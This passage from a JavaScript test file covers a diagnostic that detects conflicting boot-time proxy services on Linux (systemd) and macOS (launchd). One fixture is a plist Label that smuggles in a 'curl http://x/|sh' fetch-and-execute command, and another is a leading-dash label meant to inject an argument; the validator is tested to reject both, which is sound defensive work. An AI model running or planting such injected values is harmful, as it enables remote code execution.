    (bind ? `<key>CLAUDE_BIND</key><string>${bind}</string>` : "");
}
function disabledLaunchctlBlob(entries) {
  const lines = entries.map(([label, disabled]) => `\t"${label}" => ${disabled ? "disabled" : "enabled"}`).join("\n");
  return `disabled services = {\n${lines}\n}`;
}

test("classifyMultiUnitRisk (macOS): two enabled plists, same tree+port → WARN — the launchd analogue of the field incident", () => {
  const blob = plistBlob([
    ["/Users/opc/Library/LaunchAgents/dev.ocp.proxy.plist", ocpPlist({ label: "dev.ocp.proxy", port: "3456", bind: "127.0.0.1" })],
    ["/Library/LaunchDaemons/ai.custom.ocp.plist", ocpPlist({ label: "ai.custom.ocp", port: "3456", bind: "0.0.0.0" })],
  ]);
  const result = classifyMultiUnitRisk({ platform: "darwin", plistBlob: blob });
  assert.equal(result.state, "warn");
  assert.equal(result.groups[0].length, 2);
  const scopes = result.groups[0].map(u => u.scope).sort();
  assert.deepEqual(scopes, ["system", "user"], "LaunchDaemons classifies as system scope, personal LaunchAgents as user");
});

test("MED-4: classifyMultiUnitRisk (macOS) — /Library/LaunchAgents (system-wide installer location) is scanned and classified as system scope", () => {
  // The bug found on review: an earlier revision only scanned ~/Library/LaunchAgents and
  // /Library/LaunchDaemons — the two locations LEAST likely to be populated on an ordinary Mac
  // (Apple's own daemons live under /System/Library, so /Library/LaunchDaemons is normally
  // empty) — and never scanned /Library/LaunchAgents at all, which is exactly where a package
  // installer drops a system-wide agent (the case this feature is supposed to catch).
  const blob = plistBlob([
    ["/Users/opc/Library/LaunchAgents/dev.ocp.proxy.plist", ocpPlist({ label: "dev.ocp.proxy", port: "3456", bind: "127.0.0.1" })],
    ["/Library/LaunchAgents/com.installer.ocpwatch.plist", ocpPlist({ label: "com.installer.ocpwatch", port: "3456", bind: "0.0.0.0" })],
  ]);
  const result = classifyMultiUnitRisk({ platform: "darwin", plistBlob: blob });
  assert.equal(result.state, "warn", "/Library/LaunchAgents must be scanned, not silently skipped");
  const byName = Object.fromEntries(result.groups[0].map(u => [u.name, u]));
  assert.equal(byName["com.installer.ocpwatch"].scope, "system", "/Library/LaunchAgents is system-wide, distinct from the personal ~/Library/LaunchAgents");
  assert.equal(byName["com.installer.ocpwatch"].domain, "gui", "still a LaunchAgent — disable domain is gui/<uid>, NOT the system daemon domain");
});

test("classifyMultiUnitRisk (macOS): only the standard single OCP LaunchAgent present → clear (the common case)", () => {
  const blob = plistBlob([
    ["/Users/opc/Library/LaunchAgents/dev.ocp.proxy.plist", ocpPlist({ label: "dev.ocp.proxy", port: "3456", bind: "127.0.0.1" })],
  ]);
  assert.equal(classifyMultiUnitRisk({ platform: "darwin", plistBlob: blob }).state, "clear");
});

test("classifyMultiUnitRisk (macOS): zero plist files at all → clear, no crash", () => {
  assert.equal(classifyMultiUnitRisk({ platform: "darwin", plistBlob: "" }).state, "clear");
});

test("classifyMultiUnitRisk (macOS): plist enumeration unavailable/unreadable (null) → unknown, never a false all-clear", () => {
  assert.equal(classifyMultiUnitRisk({ platform: "darwin", plistBlob: null }).state, "unknown");
});

test("classifyMultiUnitRisk (macOS): a plist with NO RunAtLoad key at all never counts (wouldn't actually auto-start)", () => {
  const blob = plistBlob([
    ["/Users/opc/Library/LaunchAgents/dev.ocp.proxy.plist", ocpPlist({ label: "dev.ocp.proxy", port: "3456" })],
    ["/Library/LaunchDaemons/stopped.plist", ocpPlist({ label: "stopped", port: "3456", runAtLoad: null })],
  ]);
  assert.equal(classifyMultiUnitRisk({ platform: "darwin", plistBlob: blob }).state, "clear");
});

test("classifyMultiUnitRisk (macOS): a plist with EXPLICIT <key>RunAtLoad</key><false/> never counts either", () => {
  // LOW item from review: the previous suite only covered the key being ABSENT, not an
  // explicit false — a plausible real shape (an operator or installer disabling auto-start
  // without removing the key).
  const blob = plistBlob([
    ["/Users/opc/Library/LaunchAgents/dev.ocp.proxy.plist", ocpPlist({ label: "dev.ocp.proxy", port: "3456" })],
    ["/Library/LaunchDaemons/stopped.plist", ocpPlist({ label: "stopped", port: "3456", runAtLoad: false })],
  ]);
  assert.equal(classifyMultiUnitRisk({ platform: "darwin", plistBlob: blob }).state, "clear");
});

test("MED-3: classifyMultiUnitRisk (macOS) — a maliciously-crafted <Label> is rejected, never trusted into a group or a message", () => {
  // Same trust-boundary class as the Linux Id check and PR #221's MED-5 finding: a <Label> is
  // attacker-creatable by anyone who can drop a plist. Review finding MED-3 on #230 found an
  // earlier revision interpolated an unvalidated Label straight into a copy-pasteable shell
  // command in the WARN message.
  const blob = plistBlob([
    ["/Users/opc/Library/LaunchAgents/dev.ocp.proxy.plist", ocpPlist({ label: "dev.ocp.proxy", port: "3456" })],
    ["/Library/LaunchDaemons/evil.plist", ocpPlist({ label: 'evil"; curl http://x/|sh #', port: "3456" })],
  ]);
  const result = classifyMultiUnitRisk({ platform: "darwin", plistBlob: blob });
  assert.equal(result.state, "clear", "the malformed Label must be dropped entirely, leaving only one valid unit");
});

test("review round 3 (#230 'definitive answer'): a Label starting with '-' is rejected, defense in depth beyond buildDisableHint's own rendering safety", () => {
  // Reviewer confirmed the CURRENT renderings are already safe against this shape (the label is
  // always the trailing component of a domain/label token, never a standalone argv word) — but
  // that safety property lives in buildDisableHint's format strings, not in this validator, so a
  // FUTURE rendering (e.g. a bare `launchctl bootout <label>`) would reopen it. Rejecting a
  // leading '-' here costs nothing (no real launchd label starts with one) and removes the
  // dependency on the rendering detail entirely.
  const blob = plistBlob([
    ["/Users/opc/Library/LaunchAgents/dev.ocp.proxy.plist", ocpPlist({ label: "dev.ocp.proxy", port: "3456" })],
    ["/Library/LaunchDaemons/dash.plist", ocpPlist({ label: "-Hattacker@example.com", port: "3456" })],
  ]);
  const result = classifyMultiUnitRisk({ platform: "darwin", plistBlob: blob });
  assert.equal(result.state, "clear", "a Label starting with '-' must be dropped entirely, leaving only one valid unit");
});

test("classifyMultiUnitRisk (macOS): default port when CLAUDE_PROXY_PORT key is absent from the plist", () => {
  const blob = plistBlob([
    ["/Users/opc/Library/LaunchAgents/dev.ocp.proxy.plist", ocpPlist({ label: "dev.ocp.proxy" })],
    ["/Library/LaunchDaemons/other.plist", ocpPlist({ label: "other" })],
  ]);
  const result = classifyMultiUnitRisk({ platform: "darwin", plistBlob: blob });
  assert.equal(result.state, "warn");
  assert.ok(result.groups[0].every(u => u.port === "3456"), "absent CLAUDE_PROXY_PORT must default to DEFAULT_PORT on macOS too");
});

console.log("\nMulti-unit boot-race pre-flight (issue #220) — launchctl print-disabled cross-check (false-claim fix):");

test("classifyMultiUnitRisk (macOS): a persistently-disabled (launchctl disable) unit is excluded — it would never actually start", () => {
  // Verified against a real host: `launchctl print-disabled gui/<uid>` produces a
  // `disabled services = { "<label>" => enabled|disabled ... }` block. A RunAtLoad=true plist
  // that's been `launchctl disable`d is inert — warning about it would be a false positive,
  // and `launchctl disable` is the persistent remediation a Mac operator would actually use.
  const blob = plistBlob([
    ["/Users/opc/Library/LaunchAgents/dev.ocp.proxy.plist", ocpPlist({ label: "dev.ocp.proxy", port: "3456" })],
    ["/Library/LaunchDaemons/ai.custom.ocp.plist", ocpPlist({ label: "ai.custom.ocp", port: "3456" })],
  ]);
  const disabledBlob = disabledLaunchctlBlob([["dev.ocp.proxy", false], ["ai.custom.ocp", true]]);
  const result = classifyMultiUnitRisk({ platform: "darwin", plistBlob: blob, disabledBlob });
  assert.equal(result.state, "clear", "ai.custom.ocp is persistently disabled — only one live candidate remains");
});

test("classifyMultiUnitRisk (macOS): disabledBlob unavailable (null) is PERMISSIVE — degrades to 'nothing filtered', not 'unknown'", () => {
  // RunAtLoad=true is already a sufficient positive signal on its own; the disabled-overrides
  // cross-check is a refinement, not a requirement — its own absence must not escalate the
  // whole check to "can't tell" when the primary plist enumeration succeeded fine.
  const blob = plistBlob([
    ["/Users/opc/Library/LaunchAgents/dev.ocp.proxy.plist", ocpPlist({ label: "dev.ocp.proxy", port: "3456" })],
    ["/Library/LaunchDaemons/ai.custom.ocp.plist", ocpPlist({ label: "ai.custom.ocp", port: "3456" })],
  ]);
  const result = classifyMultiUnitRisk({ platform: "darwin", plistBlob: blob, disabledBlob: null });
  assert.equal(result.state, "warn", "a missing disabledBlob must not suppress an otherwise-real conflict");
});

test("review round 4 (#230 false-claim correction): a unit disabled ONLY in the SYSTEM domain (not gui) is still excluded — proves the union genuinely incorporates system, not just gui", () => {
  // The bug this fixes: an earlier revision never probed the system domain at all (claiming,
  // falsely, that it required root), so a LaunchDaemon disabled via `sudo launchctl disable
  // system/<label>` — precisely the remediation this file's OWN WARN message recommends for a
  // LaunchDaemon conflict — kept being warned about forever. Putting the disabled entry ONLY in
  // systemDisabledBlob (never in disabledBlob) is what distinguishes "the union really reads
  // both domains" from a test that would pass even if systemDisabledBlob were ignored entirely.
  const blob = plistBlob([
    ["/Users/opc/Library/LaunchAgents/dev.ocp.proxy.plist", ocpPlist({ label: "dev.ocp.proxy", port: "3456" })],
    ["/Library/LaunchDaemons/ai.custom.ocp.plist", ocpPlist({ label: "ai.custom.ocp", port: "3456" })],
  ]);
  const result = classifyMultiUnitRisk({
    platform: "darwin",
    plistBlob: blob,
    disabledBlob: disabledLaunchctlBlob([["dev.ocp.proxy", false]]), // gui domain: nothing disabled
    systemDisabledBlob: disabledLaunchctlBlob([["ai.custom.ocp", true]]), // system domain: disabled here only
  });
  assert.equal(result.state, "clear", "ai.custom.ocp is disabled in the SYSTEM domain only — must still be excluded, leaving one live candidate");
});

test("review round 4: systemDisabledBlob unavailable (null) is ALSO permissive — a partial gather (gui succeeds, system fails, or vice versa) still filters what it CAN determine", () => {
  const blob = plistBlob([
    ["/Users/opc/Library/LaunchAgents/dev.ocp.proxy.plist", ocpPlist({ label: "dev.ocp.proxy", port: "3456" })],
    ["/Library/LaunchDaemons/ai.custom.ocp.plist", ocpPlist({ label: "ai.custom.ocp", port: "3456" })],
  ]);
  // gui succeeds and finds ai.custom.ocp is NOT gui-disabled (irrelevant, it's a LaunchDaemon);
  // system read fails entirely (null) — must not escalate to "unknown", and must not silently
  // drop the conflict just because one of the two reads failed.
  const result = classifyMultiUnitRisk({
    platform: "darwin",
    plistBlob: blob,
    disabledBlob: disabledLaunchctlBlob([["dev.ocp.proxy", false]]),
    systemDisabledBlob: null,
  });
  assert.equal(result.state, "warn", "a failed system-domain read must not suppress an otherwise-real conflict — permissive, not 'unknown'");
});

console.log("\nMulti-unit boot-race pre-flight (issue #220) — gatherUnitCandidates (impure layer):");

test("gatherUnitCandidates: listing fails (run throws) → showOut is null, not \"\" — never silently treated as zero enabled units", () => {
  const run = (cmd) => { throw new Error(`systemctl: command not found`); };
  const raw = gatherUnitCandidates(run, "linux");
  assert.equal(raw.userShowOut, null);
  assert.equal(raw.systemShowOut, null);
});

test("gatherUnitCandidates: listing succeeds with zero candidates → showOut is \"\" (confirmed empty), skips the show call entirely", () => {
  let showCalled = false;
  const run = (cmd) => {
    if (/list-unit-files/.test(cmd)) return ""; // no enabled .service units at all
    showCalled = true;
    return "should not be reached";
  };
  const raw = gatherUnitCandidates(run, "linux");
  assert.equal(raw.userShowOut, "");
  assert.equal(raw.systemShowOut, "");
  assert.equal(showCalled, false, "show must not be invoked with an empty candidate list");
});

test("gatherUnitCandidates: listing succeeds with candidates, but the show call fails → showOut is null (unknown), not \"\"", () => {
  const run = (cmd) => {
    if (/list-unit-files/.test(cmd)) return "ocp-proxy.service enabled\n";
    if (/show/.test(cmd)) throw new Error("systemctl show: timed out");
    throw new Error("unexpected: " + cmd);
  };
  const raw = gatherUnitCandidates(run, "linux");
  assert.equal(raw.userShowOut, null);
  assert.equal(raw.systemShowOut, null);
});

test("HIGH-1/HIGH-2: gatherUnitCandidates batches ALL candidates into ONE show call per scope, and both listing commands request --state=enabled", () => {
  const capturedCmds = [];
  const run = (cmd) => {
    capturedCmds.push(cmd);
    if (cmd.includes("--user list-unit-files")) return "a.service enabled\nb.service enabled\nc.service enabled\n";
    if (cmd.includes("list-unit-files")) return "d.service enabled\ne.service enabled\n";
    if (cmd.includes("--user show")) return "Id=a.service\nExecStart={ argv[]=/bin/true ; }\nEnvironment=";
    if (cmd.includes("systemctl show")) return "Id=d.service\nExecStart={ argv[]=/bin/true ; }\nEnvironment=";
    throw new Error("unexpected: " + cmd);
  };
  gatherUnitCandidates(run, "linux");

  // HIGH-1: all assertions below run AFTER gatherUnitCandidates returns, on CAPTURED command
  // strings — never from inside the `run` fake itself, where a thrown AssertionError would be
  // swallowed by gatherUnitCandidates' own try/catch before reaching the test framework (see
  // the module header comment and the PR body's mutation table for the deliberately-false
  // assertion that proved the old version of this test could never fail).
  const userListingCmds = capturedCmds.filter(c => c.includes("--user list-unit-files"));
  const systemListingCmds = capturedCmds.filter(c => c.includes("list-unit-files") && !c.includes("--user"));
  const userShowCmds = capturedCmds.filter(c => c.includes("--user show"));
  const systemShowCmds = capturedCmds.filter(c => c.includes("systemctl show") && !c.includes("--user"));

  assert.equal(userShowCmds.length, 1, "exactly one batched show call for the user scope");
  assert.equal(systemShowCmds.length, 1, "exactly one batched show call for the system scope");
  assert.ok(userShowCmds[0].includes("a.service") && userShowCmds[0].includes("b.service") && userShowCmds[0].includes("c.service"),
    "all three user-scope candidates must appear in the SAME show command");

  // HIGH-2 RECURRENCE (review round 3 on #230): the round-2 fix asserted `--state=enabled` on
  // the LISTING commands but captured the SHOW command three lines later and asserted nothing
  // about its CONTENTS — so `-p UnitFileState` / `-p EnvironmentFiles` / `-p Environment` could
  // each be silently dropped from the real command with the whole suite staying green. Losing
  // `-p UnitFileState` is the worst of the three: `props.UnitFileState` becomes `undefined`,
  // the allowlist's documented "permissive when absent" fires, and the HIGH-2 defense-in-depth
  // gate this round exists to add evaporates — right back to the single point of failure
  // (`--state=enabled` alone) this round was supposed to remove. Losing `-p Environment` is
  // worse still under MED-7's port-only grouping: every OCP unit falls back to port 3456 and
  // bind "(default bind)", collapsing every OCP unit on the host into one fabricated WARN.
  //
  // extractShowProperties tokenizes the command and returns the EXACT argument following each
  // `-p` flag — NOT a substring check. `cmd.includes("-p Environment")` would be a VACUOUS
  // check here: that literal 14-character sequence is itself a PREFIX of "-p EnvironmentFiles"
  // ("-p Environment" + "Files" = "-p EnvironmentFiles"), so it stays true even if the bare
  // `-p Environment` flag is deleted outright, as long as `-p EnvironmentFiles` remains — the
  // same vacuous-substring shape already caught once in this PR (the /Library/LaunchAgents
  // mutation). Token-array membership doesn't have that failure mode: "Environment" and
  // "EnvironmentFiles" are distinct array elements, never substrings of each other as tokens.
  function extractShowProperties(cmd) {
    const tokens = cmd.split(/\s+/);
    const props = [];
    for (let i = 0; i < tokens.length - 1; i++) {
      if (tokens[i] === "-p") props.push(tokens[i + 1]);
    }
    return props;
  }
  const userShowProps = extractShowProperties(userShowCmds[0]);
  const systemShowProps = extractShowProperties(systemShowCmds[0]);
  for (const prop of ["Id", "ExecStart", "Environment", "UnitFileState", "EnvironmentFiles"]) {
    assert.ok(userShowProps.includes(prop), `user-scope show command must request -p ${prop} (exact token match)`);
    assert.ok(systemShowProps.includes(prop), `system-scope show command must request -p ${prop} (exact token match)`);
  }

  // HIGH-2: the entire "only ENABLED units are candidates" precondition rests on this literal
  // flag being present in BOTH listing commands. A control mutation deleting it survived the
  // whole suite untouched (see PR body) because nothing had ever asserted on the command
  // string itself.
  assert.equal(userListingCmds.length, 1);
  assert.equal(systemListingCmds.length, 1);
  assert.ok(userListingCmds[0].includes("--state=enabled"), "user-scope listing must request --state=enabled");
  assert.ok(systemListingCmds[0].includes("--state=enabled"), "system-scope listing must request --state=enabled");
});

test("HIGH-1: gatherUnitCandidates (macOS) — a single shell command enumerates LaunchAgents (both dirs) and LaunchDaemons", () => {
  const capturedCmds = [];
  const run = (cmd) => { capturedCmds.push(cmd); return ""; };
  gatherUnitCandidates(run, "darwin");
  const plistCmds = capturedCmds.filter(c => c.includes("for f in"));
  assert.equal(plistCmds.length, 1, "macOS plist enumeration costs exactly one subprocess spawn");
  assert.ok(plistCmds[0].includes('"$HOME/Library/LaunchAgents"'), "must scan the personal LaunchAgents dir");
  // MED-4: must ALSO scan /Library/LaunchAgents (a package installer's standard system-wide
  // agent location) — an earlier revision omitted this, scanning only the two directories
  // least likely to be populated on an ordinary Mac. NOTE: this must be a SPACE-anchored check
  // (" /Library/LaunchAgents/"), not a bare substring — a plain `.includes("/Library/
  // LaunchAgents")` is a VACUOUS pass here, because that exact substring already occurs inside
  // `"$HOME/Library/LaunchAgents"` above; removing the standalone system-wide glob entirely
  // from the generated command still satisfies a bare substring check. Caught by mutation
  // during review of this PR — see the PR body's mutation table.
  assert.ok(plistCmds[0].includes(" /Library/LaunchAgents/"), "must scan the STANDALONE /Library/LaunchAgents (system-wide installer location), not just the $HOME-prefixed personal one");
  assert.ok(plistCmds[0].includes("/Library/LaunchDaemons"), "must scan /Library/LaunchDaemons");
});

test("gatherUnitCandidates (macOS): issues launchctl print-disabled reads for BOTH the gui and system domains (review round 4: system is unprivileged too, not out of scope)", () => {
  // Review round 4 on #230, false-claim correction: an earlier revision claimed the system
  // domain "requires root to query" and left it unprobed. Verified false directly on a live
  // host (uid 501, no sudo, `launchctl print-disabled system` exits 0) — and the false claim had
  // a self-inflicted consequence, since this file's OWN WARN recommends `sudo launchctl disable
  // system/<label>` for a LaunchDaemon conflict, so an operator who followed that advice was
  // warned about the same, now-disabled unit forever.
  const capturedCmds = [];
  const run = (cmd) => { capturedCmds.push(cmd); return ""; };
  gatherUnitCandidates(run, "darwin");
  const disabledCmds = capturedCmds.filter(c => c.includes("print-disabled"));
  assert.equal(disabledCmds.length, 2, "exactly two print-disabled reads — gui domain AND system domain");
  assert.ok(disabledCmds.some(c => c.includes("gui/")), "must query the gui/<uid> domain (covers every LaunchAgent, personal or system-wide)");
  assert.ok(disabledCmds.some(c => /print-disabled system(\s|$|2>)/.test(c)), "must ALSO query the system domain (covers LaunchDaemons) — not just gui/<uid>");
});

test("MED-4 (real shell, verified mechanism): a non-matching TRAILING glob makes a bare for-loop throw and discard earlier real output — the trailing no-op fixes it", () => {
  // The actual bug found on review, reproduced here with a REAL subprocess against a real
  // scratch directory (not a mocked command string): `for f in <dir>/*.plist; do [ -f "$f" ]
  // && ...; done` — when the LAST glob in the list expands to nothing, the shell leaves it as
  // a literal unmatched pattern, `[ -f "<literal>" ]` is false, and that false test's exit code
  // becomes the WHOLE for-loop's exit code. execSync throws on that non-zero exit and DISCARDS
  // whatever stdout an EARLIER, successful iteration already produced. On an ordinary Mac this
  // is the COMMON case, not an edge case: /Library/LaunchDaemons is normally empty (Apple's own
  // daemons live under /System/Library).
  const scratch = mkdtempSync(join(tmpdir(), "ocp-doctor-mac-glob-test-"));
  try {
    writeFileSync(join(scratch, "one.plist"), "marker-content");
    const bareCmd = `for f in "${scratch}"/*.plist "${scratch}/nonexistent-subdir-xyz"/*.plist; do [ -f "$f" ] && cat "$f"; done`;

    let threwOnBare = false;
    try { execFileSync("sh", ["-c", bareCmd]); } catch { threwOnBare = true; }
    assert.equal(threwOnBare, true,
      "control: without a trailing no-op, a non-matching TRAILING glob makes the whole command fail — discarding the real, earlier match");

    const fixedCmd = bareCmd + "; :";
    const out = execFileSync("sh", ["-c", fixedCmd]).toString();
    assert.ok(out.includes("marker-content"), "with the trailing `; :`, the earlier successful match's real output survives");
  } finally {
    rmSync(scratch, { recursive: true, force: true });
  }
});

test("MED-4: the actual darwin plist-enumeration command generated by gatherUnitCandidates ends with the no-op terminator", () => {
  let capturedCmd;
  const run = (cmd) => { if (cmd.includes("for f in")) capturedCmd = cmd; return ""; };
  gatherUnitCandidates(run, "darwin");
  assert.ok(capturedCmd, "expected a 'for f in' plist-enumeration command to be issued");
  assert.ok(/;\s*:\s*$/.test(capturedCmd),
    `command must end with a no-op (e.g. "; :") so a non-matching trailing glob's exit code can never propagate; got: ${capturedCmd}`);
});

test("gatherUnitCandidates: past MAX_UNIT_CANDIDATES (200) enabled units in one scope, skip `show` and degrade to unknown rather than an oversized command line", () => {
  const manyNames = Array.from({ length: 201 }, (_, i) => `unit-${i}.service`).join(" enabled\n") + " enabled\n";
  let showCalled = false;
  const run = (cmd) => {
    if (cmd.includes("--user list-unit-files")) return manyNames;
    if (cmd.includes("list-unit-files")) return ""; // system scope: nothing enabled
    if (cmd.includes("show")) { showCalled = true; return "should not be reached"; }
    throw new Error("unexpected: " + cmd);
  };
  const raw = gatherUnitCandidates(run, "linux");
  assert.equal(showCalled, false, "must not attempt an oversized batched show call");
  assert.equal(raw.userShowOut, null, "capped scope must degrade to unknown (null), never '' (false all-clear)");
  assert.equal(classifyMultiUnitRisk(raw).state, "unknown");
});

test("gatherUnitCandidates: EXACTLY at the MAX_UNIT_CANDIDATES boundary (200) is NOT capped — only strictly MORE than 200 is", () => {
  const exactlyAtCap = Array.from({ length: 200 }, (_, i) => `unit-${i}.service`).join(" enabled\n") + " enabled\n";
  let showCalled = false;
  const run = (cmd) => {
    if (cmd.includes("--user list-unit-files")) return exactlyAtCap;
    if (cmd.includes("list-unit-files")) return "";
    if (cmd.includes("show")) { showCalled = true; return "Id=unit-0.service\nExecStart={ argv[]=/bin/true ; }\nEnvironment="; }
    throw new Error("unexpected: " + cmd);
  };
  const raw = gatherUnitCandidates(run, "linux");
  assert.equal(showCalled, true, "exactly 200 candidates must still be probed — the cap is > 200, not >= 200");
  assert.notEqual(raw.userShowOut, null);
});

test("gatherUnitCandidates: the MAX_UNIT_CANDIDATES cap applies to the SYSTEM scope too, independent of the user scope", () => {
  // The earlier suite only exercised the cap on the user scope — a symmetric bug on the system
  // scope (e.g. only checking userNames.length) would have gone uncaught.
  const manyNames = Array.from({ length: 201 }, (_, i) => `sys-unit-${i}.service`).join(" enabled\n") + " enabled\n";
  let systemShowCalled = false;
  const run = (cmd) => {
    if (cmd.includes("--user list-unit-files")) return ""; // user scope: nothing enabled
    if (cmd.includes("list-unit-files")) return manyNames;
    if (cmd.includes("show")) { systemShowCalled = true; return "should not be reached"; }
    throw new Error("unexpected: " + cmd);
  };
  const raw = gatherUnitCandidates(run, "linux");
  assert.equal(systemShowCalled, false, "must not attempt an oversized batched show call for the system scope either");
  assert.equal(raw.systemShowOut, null);
  assert.equal(classifyMultiUnitRisk(raw).state, "unknown");
});

console.log("\nMulti-unit boot-race pre-flight (issue #220) — full pipeline via runDoctor:");

test("runDoctor: two conflicting enabled units → pushes an actionable multi_unit_boot_race WARN (not FAIL)", async () => {
  const result = await runDoctor({
    skipNetwork: false,
    mockVersion: "v3.26.0",
    mockLatest: "v3.26.0",
    mockHealth: { status: 200, body: { version: "3.26.0", auth: { ok: true } } },
    mockPlatform: "linux",
    run: (cmd) => {
      if (cmd.includes("--user list-unit-files")) return "ocp-proxy.service enabled\n";
      if (cmd.includes("list-unit-files")) return "ocp.service enabled\n";
      if (cmd.includes("--user show")) return FIELD_INCIDENT_USER_SHOW;
      if (cmd.includes("systemctl show")) return FIELD_INCIDENT_SYSTEM_SHOW;
      throw new Error("unexpected: " + cmd);
    },
  });
  const check = result.checks.find(c => c.id === "multi_unit_boot_race");
  assert.ok(check, "expected a multi_unit_boot_race check to be pushed");
  assert.equal(check.level, "WARN", "must be WARN, never FAIL — a FAIL would block runUpgrade() for every kind except fresh_install");
  assert.ok(check.message.includes("ocp-proxy.service") && check.message.includes("ocp.service"),
    "message must name BOTH units");
  assert.ok(check.message.includes("127.0.0.1") && check.message.includes("0.0.0.0"),
    "message must name the bind-address difference — the actual LAN-reachability hazard");
  assert.ok(check.message.includes("same working tree"), "message must note the units share a working tree");
  assert.ok(check.message.includes("disable"), "message must say what to do (disable the stray unit)");
  // WARN must not flip ready_to_upgrade to false — runUpgrade()'s pre-flight guard
  // (scripts/upgrade.mjs) only tolerates ready_to_upgrade=false for kind="fresh_install".
  assert.equal(result.ready_to_upgrade, true);
});

test("MED-7: runDoctor — same port, DIFFERENT working tree → NOW a WARN, message names both trees and calls out the difference", async () => {
  const userShow = `Id=a.service\nExecStart={ argv[]=/usr/bin/node /home/opc/ocp-A/server.mjs ; }\nEnvironment=CLAUDE_PROXY_PORT=3456`;
  const systemShow = `Id=b.service\nExecStart={ argv[]=/usr/bin/node /home/opc/ocp-B/server.mjs ; }\nEnvironment=CLAUDE_PROXY_PORT=3456`;
  const result = await runDoctor({
    skipNetwork: false,
    mockVersion: "v3.26.0",
    mockLatest: "v3.26.0",
    mockHealth: { status: 200, body: { version: "3.26.0", auth: { ok: true } } },
    mockPlatform: "linux",
    run: (cmd) => {
      if (cmd.includes("--user list-unit-files")) return "a.service enabled\n";
      if (cmd.includes("list-unit-files")) return "b.service enabled\n";
      if (cmd.includes("--user show")) return userShow;
      if (cmd.includes("systemctl show")) return systemShow;
      throw new Error("unexpected: " + cmd);
    },
  });
  const check = result.checks.find(c => c.id === "multi_unit_boot_race");
  assert.ok(check, "two units on the same port from different trees must still warn — they race for the port and would serve DIFFERENT code to whoever wins");
  assert.equal(check.level, "WARN");
  assert.ok(check.message.includes("DIFFERENT working trees"), "message must call out that the trees differ");
  assert.ok(check.message.includes("ocp-A") && check.message.includes("ocp-B"), "message must name both trees");

  // Discretionary review finding on #230: when trees differ, these are two SEPARATE installs —
  // nominating one as "the stray one" is a judgement this check has no basis for making (it
  // would contradict the PR's own stated "does not assert which unit is correct" principle).
  // Must NOT single one out; must offer both disable commands and let the operator decide.
  assert.ok(!check.message.includes("the stray one"), "must not nominate a 'stray' unit when the trees genuinely differ — that's two separate installs, not drifted config on one");
  assert.ok(check.message.includes("systemctl --user disable a.service"), "must offer the user-scope unit's own disable command");
  assert.ok(check.message.includes("systemctl disable b.service"), "must offer the system-scope unit's own disable command too — neither is nominated over the other");
});

test("MED-7 remediation adaptation: buildDisableHint STILL nominates a target when trees are the SAME (drifted config on one install, matches the field incident's real remediation)", async () => {
  const result = await runDoctor({
    skipNetwork: false,
    mockVersion: "v3.26.0",
    mockLatest: "v3.26.0",
    mockHealth: { status: 200, body: { version: "3.26.0", auth: { ok: true } } },
    mockPlatform: "linux",
    run: (cmd) => {
      if (cmd.includes("--user list-unit-files")) return "ocp-proxy.service enabled\n";
      if (cmd.includes("list-unit-files")) return "ocp.service enabled\n";
      if (cmd.includes("--user show")) return FIELD_INCIDENT_USER_SHOW;
      if (cmd.includes("systemctl show")) return FIELD_INCIDENT_SYSTEM_SHOW;
      throw new Error("unexpected: " + cmd);
    },
  });
  const check = result.checks.find(c => c.id === "multi_unit_boot_race");
  assert.ok(check.message.includes("the stray one"), "same-tree case (the field incident's own shape) should still nominate a target — the check has a reasonable basis here");
});

test("PICK_always_first guard: pickDisableTarget prefers the user-scope unit even when it is NOT first in gather order", () => {
  // Every other test in this file happens to have the user-scope unit gathered FIRST (matching
  // the real glob/listing order), which cannot distinguish "prefer user scope" from a naive
  // "just take group[0]" — this test deliberately reverses the order (system-scope plist listed
  // BEFORE the personal LaunchAgent in the fixture blob) so the two formulas actually diverge.
  const blob = plistBlob([
    ["/Library/LaunchDaemons/ai.custom.ocp.plist", ocpPlist({ label: "ai.custom.ocp", port: "3456", bind: "0.0.0.0" })],
    ["/Users/opc/Library/LaunchAgents/dev.ocp.proxy.plist", ocpPlist({ label: "dev.ocp.proxy", port: "3456", bind: "127.0.0.1" })],
  ]);
  return runDoctor({
    skipNetwork: false,
    mockVersion: "v3.26.0",
    mockLatest: "v3.26.0",
    mockHealth: { status: 200, body: { version: "3.26.0", auth: { ok: true } } },
    mockPlatform: "darwin",
    run: (cmd) => {
      if (cmd.includes("for f in")) return blob;
      if (cmd.includes("print-disabled")) return disabledLaunchctlBlob([["dev.ocp.proxy", false], ["ai.custom.ocp", false]]);
      throw new Error("unexpected: " + cmd);
    },
  }).then((result) => {
    const check = result.checks.find(c => c.id === "multi_unit_boot_race");
    assert.ok(check.message.includes("gui/$(id -u)/dev.ocp.proxy"),
      "must nominate the user-scope unit (dev.ocp.proxy) even though the system-scope one (ai.custom.ocp) is first in gather order");
    assert.ok(!check.message.includes("system/ai.custom.ocp"),
      "must not nominate the system-scope unit just because it's positionally first");
  });
});

test("DOMAIN_always_gui guard: two conflicting LaunchDaemons (no LaunchAgent involved) render the system-domain disable command", () => {
  // No test previously exercised this branch at all — the reviewer rendered it by hand to
  // confirm the code was right. Two system-scope units (both LaunchDaemons) means
  // pickDisableTarget's ".find(scope==='user')" finds nothing and falls to group[0], which here
  // has domain:"system" — the ONLY way to reach buildDisableCommand's `sudo launchctl disable
  // system/<label>` branch.
  const blob = plistBlob([
    ["/Library/LaunchDaemons/com.company.a.plist", ocpPlist({ label: "com.company.a", port: "3456" })],
    ["/Library/LaunchDaemons/com.company.b.plist", ocpPlist({ label: "com.company.b", port: "3456" })],
  ]);
  return runDoctor({
    skipNetwork: false,
    mockVersion: "v3.26.0",
    mockLatest: "v3.26.0",
    mockHealth: { status: 200, body: { version: "3.26.0", auth: { ok: true } } },
    mockPlatform: "darwin",
    run: (cmd) => {
      if (cmd.includes("for f in")) return blob;
      if (cmd.includes("print-disabled")) return disabledLaunchctlBlob([["com.company.a", false], ["com.company.b", false]]);
      throw new Error("unexpected: " + cmd);
    },
  }).then((result) => {
    const check = result.checks.find(c => c.id === "multi_unit_boot_race");
    assert.ok(check, "two enabled LaunchDaemons on the same port must warn");
    assert.ok(check.message.includes("sudo launchctl disable system/com.company.a"),
      "must render the SYSTEM-domain disable command when the nominated target is a LaunchDaemon");
  });
});

test("runDoctor: exactly one enabled OCP unit → no multi_unit_boot_race check pushed", async () => {
  const result = await runDoctor({
    skipNetwork: false,
    mockVersion: "v3.26.0",
    mockLatest: "v3.26.0",
    mockHealth: { status: 200, body: { version: "3.26.0", auth: { ok: true } } },
    mockPlatform: "linux",
    run: (cmd) => {
